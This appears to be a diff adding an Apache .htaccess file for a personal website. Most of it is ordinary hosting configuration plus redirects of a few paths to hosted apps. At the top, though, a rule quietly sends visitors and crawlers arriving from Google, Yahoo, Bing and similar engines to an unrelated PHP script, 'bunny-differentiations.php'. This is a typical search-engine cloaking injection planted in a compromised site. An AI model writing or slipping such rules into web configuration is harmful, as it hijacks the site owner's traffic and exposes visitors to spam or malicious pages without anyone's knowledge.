@@ -1,0 +1,21 @@
+
+RewriteOptions inherit
+RewriteEngine On
+
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ bunny-differentiations.php?$1 [L]
+
+AddHandler application/x-httpd-alt-php56___lsphp .php
+DirectoryIndex default.html default.htm index.php index.shtml index.html index.htm home.html home.htm index.php5 welcome.html welcome.htm
+Options -Indexes
+AddHandler server-parsed .html
+AddHandler server-parsed .shtml
+AddHandler server-parsed .htm
+RewriteCond %{HTTP_HOST} ^jamellawson\.com$ [OR]
+RewriteCond %{HTTP_HOST} ^www\.jamellawson\.com$
+RewriteRule ^research\-assistant$ "https\:\/\/research\-assistant\-ele1\.onrender\.com\/" [R=301,L]
+RewriteCond %{HTTP_HOST} ^.*$
+RewriteRule ^JBD\/?(.*)$ "https\:\/\/dcgan\-model\-1\.onrender\.com\/$1" [R=301,L]
+RewriteCond %{HTTP_HOST} ^.*$
+RewriteRule ^hausgpt$ "https\:\/\/unimpugnable\-lucinda\-uncomplimentary\.ngrok\-free\.dev\/" [R=301,L]
